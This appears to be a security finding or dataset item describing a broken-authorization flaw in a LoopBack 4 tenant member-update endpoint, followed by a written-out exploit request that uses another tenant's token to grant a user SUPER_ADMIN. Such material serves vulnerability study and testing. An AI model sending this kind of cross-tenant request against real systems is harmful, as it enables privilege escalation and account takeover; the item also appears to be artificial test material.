diagnosis: The LoopBack 4 team member update endpoint takes tenantId and memberId from the path, but executes updateById directly on memberId without asserting that the authenticated caller has administrative rights on the specified tenantId or that memberId belongs to tenantId.
exploit_request:
PATCH /tenants/tenant_alpha_01/members/usr_sec_admin/role HTTP/1.1
Host: console.cloudops.net
Authorization: Bearer <tenant_beta_user_token>
Content-Type: application/json

{"role": "SUPER_ADMIN"}
